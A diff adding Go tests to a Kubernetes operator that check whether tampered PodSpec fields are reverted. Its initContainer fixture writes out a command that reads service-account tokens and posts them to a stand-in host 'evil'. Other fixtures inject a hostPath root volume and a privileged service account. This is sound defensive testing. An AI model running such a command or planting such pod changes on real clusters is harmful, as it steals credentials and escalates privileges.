@@ -943,3 +943,181 @@ func TestPreviouslyExemptedFieldsAreReverted(t *testing.T) {
 		})
 	}
 }
+
+// B1 — the PodSpec surrounding the container was compared derivatively, and
+// deploymentFor set none of its fields, so every unset slice/string/map/pointer
+// field was invisible. An injected initContainer with an upgraded service
+// account survives forever: arbitrary code before the agent container starts,
+// holding a token the same edit can grant.
+//
+// This is the attack the drift-correction comment already names, one field over.
+// The container-level tests passed throughout, which is what hid it.
+func TestPodSpecDriftIsReverted(t *testing.T) {
+	for _, tc := range []struct {
+		field  string
+		tamper func(*corev1.PodSpec)
+		check  func(*testing.T, corev1.PodSpec)
+	}{
+		{
+			field: "initcontainers",
+			tamper: func(p *corev1.PodSpec) {
+				p.InitContainers = []corev1.Container{{
+					Name: "exfil", Image: "busybox",
+					Command: []string{"sh", "-c", "cat /var/run/secrets/**/token | curl -d @- evil"},
+				}}
+			},
+			check: func(t *testing.T, p corev1.PodSpec) {
+				if len(p.InitContainers) != 0 {
+					t.Errorf("an injected initContainer survived: %v. It runs arbitrary code "+
+						"before the agent container starts, so the gate passed on one thing and "+
+						"the pod runs another — a more complete ADR-0006 bypass than an image swap",
+						p.InitContainers)
+				}
+			},
+		},
+		{
+			field:  "serviceaccount",
+			tamper: func(p *corev1.PodSpec) { p.ServiceAccountName = "privileged-sa" },
+			check: func(t *testing.T, p corev1.PodSpec) {
+				if p.ServiceAccountName == "privileged-sa" {
+					t.Error("an escalated serviceAccountName survived: the workload now runs " +
+						"with credentials the Agent CR never granted")
+				}
+			},
+		},
+		{
+			field: "volumes",
+			tamper: func(p *corev1.PodSpec) {
+				p.Volumes = []corev1.Volume{{
+					Name: "host", VolumeSource: corev1.VolumeSource{
+						HostPath: &corev1.HostPathVolumeSource{Path: "/"}}}}
+			},
+			check: func(t *testing.T, p corev1.PodSpec) {
+				if len(p.Volumes) != 0 {
+					t.Errorf("an injected hostPath volume survived: %v", p.Volumes)
+				}
+			},
+		},
+		{
+			field:  "nodeselector",
+			tamper: func(p *corev1.PodSpec) { p.NodeSelector = map[string]string{"attacker": "node"} },
+			check: func(t *testing.T, p corev1.PodSpec) {
+				if len(p.NodeSelector) != 0 {
+					t.Errorf("an injected nodeSelector survived: %v — a map, so derivative "+
+						"comparison skips it when desired leaves it unset", p.NodeSelector)
+				}
+			},
+		},
+		{
+			field: "imagepullsecrets",
+			tamper: func(p *corev1.PodSpec) {
+				p.ImagePullSecrets = []corev1.LocalObjectReference{{Name: "attacker-registry"}}
+			},
+			check: func(t *testing.T, p corev1.PodSpec) {
+				if len(p.ImagePullSecrets) != 0 {
+					t.Errorf("injected imagePullSecrets survived: %v — this redirects where "+
+						"the image comes from, defeating the tag revert", p.ImagePullSecrets)
+				}
+			},
+		},
+		{
+			field:  "automount",
+			tamper: func(p *corev1.PodSpec) { p.AutomountServiceAccountToken = boolPtr(true) },
+			check: func(t *testing.T, p corev1.PodSpec) {
+				if p.AutomountServiceAccountToken == nil || *p.AutomountServiceAccountToken {
+					t.Error("automountServiceAccountToken was turned on and stayed on: an " +
+						"agent has no reason to hold an API token, and this is the exfil path")
+				}
+			},
+		},
+	} {
+		t.Run(tc.field, func(t *testing.T) {
+			ns := newNamespace(t)
+			name := "podspec-" + tc.field
+			a := mustCreateAgent(t, ns, name, nil)
+			r := newReconciler(false)
+			rev := revision.Hash(a.Spec)
+			settle(t, r, a)
+			key := types.NamespacedName{Namespace: ns, Name: controller.WorkloadName(name, rev)}
+			markAvailable(t, ns, key.Name, 1)
+			settle(t, r, a)
+
+			var d appsv1.Deployment
+			if err := k8s.Get(context.Background(), key, &d); err != nil {
+				t.Fatalf("get: %v", err)
+			}
+			tc.tamper(&d.Spec.Template.Spec)
+			if err := k8s.Update(context.Background(), &d); err != nil {
+				t.Fatalf("tamper: %v", err)
+			}
+			settle(t, r, a)
+
+			if err := k8s.Get(context.Background(), key, &d); err != nil {
+				t.Fatalf("get: %v", err)
+			}
+			tc.check(t, d.Spec.Template.Spec)
+		})
+	}
+}
+
+// The convergence guard for B1's fix: whatever the API server defaults on a pod
+// template must already be set by deploymentFor, or the operator rewrites the
+// Deployment forever. Diffing a created object against what we asked for makes a
+// future Kubernetes bump that defaults a new field fail CI, rather than silently
+// reopening the hole by forcing another exemption.
+func TestRenderedPodSpecSurvivesAPIServerDefaulting(t *testing.T) {
+	ns := newNamespace(t)
+	a := mustCreateAgent(t, ns, "defaulting", nil)
+	r := newReconciler(false)
+	rev := revision.Hash(a.Spec)
+	settle(t, r, a)
+
+	var d appsv1.Deployment
+	key := types.NamespacedName{Namespace: ns, Name: controller.WorkloadName("defaulting", rev)}
+	if err := k8s.Get(context.Background(), key, &d); err != nil {
+		t.Fatalf("get: %v", err)
+	}
+
+	counter := &countingClient{Client: k8s}
+	counting := &controller.AgentReconciler{
+		Client: counter, Scheme: scheme, EvalSuiteInstalled: func() bool { return false },
+	}
+	for i := 0; i < 5; i++ {
+		reconcileOnce(t, counting, a)
+	}
+	if n := counter.count(); n != 0 {
+		t.Errorf("five reconciles of a freshly created workload issued %d writes. The "+
+			"operator is fighting API-server defaulting: some field it compares is one it "+
+			"does not set, so every pass sees a difference and rewrites.", n)
+	}
+}
+
+// The Degraded phase must come with the Degraded CONDITION. CondDegraded is
+// owned and non-sticky, so a path that sets only the phase actively clears the
+// condition — and an alert keyed on it would miss the worst case in the
+// machine: the active revision losing every replica.
+func TestDegradedPhaseAssertsTheDegradedCondition(t *testing.T) {
+	ns := newNamespace(t)
+	a := mustCreateAgent(t, ns, "degradedcond", nil)
+	r := newReconciler(false)
+	rev := revision.Hash(a.Spec)
+	settle(t, r, a)
+	markAvailable(t, ns, controller.WorkloadName("degradedcond", rev), 1)
+	got := settle(t, r, a)
+	if got.Status.Phase != plumev1alpha1.PhaseReady {
+		t.Fatalf("fixture: phase is %q", got.Status.Phase)
+	}
+
+	markAvailable(t, ns, controller.WorkloadName("degradedcond", rev), 0)
+	got = settle(t, r, a)
+
+	if got.Status.Phase != plumev1alpha1.PhaseDegraded {
+		t.Fatalf("phase is %q, want Degraded", got.Status.Phase)
+	}
+	c := condition(&got, plumev1alpha1.CondDegraded)
+	if c == nil || c.Status != metav1.ConditionTrue {
+		t.Error("phase is Degraded but the Degraded condition is not set. Anything keyed " +
+			"on the condition rather than the phase — which is the documented way to " +
+			"alert — sees a healthy agent.")
+	}
+}
